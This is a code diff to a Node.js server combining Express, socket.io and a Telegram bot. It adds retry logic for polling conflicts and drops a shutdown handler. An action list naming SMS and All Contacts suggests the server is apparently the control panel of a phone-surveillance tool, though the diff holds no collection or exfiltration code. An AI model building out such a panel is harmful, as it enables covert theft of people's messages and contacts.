@@ -2,7 +2,6 @@ const express = require('express');
 const http = require('http');
 const { Server } = require('socket.io');
 const TelegramBot = require('node-telegram-bot-api');
-const https = require('https');
 const multer = require('multer');
 const fs = require('fs');
 
@@ -10,24 +9,30 @@ const app = express();
 const server = http.createServer(app);
 const io = new Server(server);
 const uploader = multer();
+const data = JSON.parse(fs.readFileSync('./data.json', 'utf8'));
 
-// Read and parse data.json file
-const dataPath = './data.json';
-let data;
-try {
-    data = JSON.parse(fs.readFileSync(dataPath, 'utf8'));
-} catch (error) {
-    console.error(`Error reading ${dataPath}:`, error);
-    process.exit(1);
-}
+// Initialize Telegram bot with polling
+let bot;
 
-// Initialize Telegram bot
-const bot = new TelegramBot(data.token, { polling: true });
+const initializeBot = () => {
+    bot = new TelegramBot(data.token, { polling: true, request: {} });
 
-// Map to hold application data
+    bot.on('polling_error', (error) => {
+        console.error(`Polling error: ${error.code} - ${error.message}`);
+        if (error.code === 'ETELEGRAM' && error.response.body.error_code === 409) {
+            console.log('Reinitializing bot after 409 Conflict error...');
+            setTimeout(initializeBot, 5000); // Retry after 5 seconds
+        }
+    });
+
+    bot.on('message', (msg) => {
+        // Handle Telegram bot messages here
+    });
+};
+
+initializeBot();
+
 const appData = new Map();
-
-// Define available actions
 const actions = [
     '✯ SMS ✯',
     '✯ All Contacts ✯',
@@ -63,20 +68,3 @@ io.on('connection', (socket) => {
     console.log('New connection established');
     // Define other socket event handlers here
 });
-
-bot.on('message', (msg) => {
-    // Define Telegram bot message handler here
-    console.log('Received message:', msg);
-});
-
-// Ensure only one instance of the bot is running
-const shutdown = () => {
-    bot.stopPolling();
-    server.close(() => {
-        console.log('Server closed');
-        process.exit(0);
-    });
-};
-
-process.on('SIGINT', shutdown);
-process.on('SIGTERM', shutdown);
